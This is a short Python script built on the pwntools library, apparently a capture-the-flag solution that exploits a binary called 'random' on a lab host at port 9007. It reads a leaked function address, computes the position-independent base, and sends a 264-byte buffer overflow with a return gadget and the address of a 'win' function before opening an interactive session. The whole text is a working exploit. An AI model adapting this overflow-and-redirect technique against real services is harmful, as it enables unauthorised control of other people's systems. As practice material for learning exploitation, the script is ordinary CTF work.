from pwn import *

elf = context.binary = ELF('./random', checksec=False)
context.log_level = 'debug'

io = remote('10.10.39.153', 9007)

offset = 264
ret = 0x101a

# Take in the leaked address of 'vuln'
io.recvuntil('secret ')
vuln_leak = int(io.recvline(), 16)


# Calculate the base address at runtime
elf.address = vuln_leak - elf.sym['vuln']
log.info(f'Pie base: {[hex(elf.address)]}')


# Using the elf object on 'win' automatically updates its address on runtime


# Updated value for ret
ret_new = ret + elf.address
log.info(f'Updated ret address: {[hex(ret_new)]}')




payload = flat(
	b'A' * offset,
	ret_new,
	elf.sym['win']
)



io.sendline(payload)
io.interactive()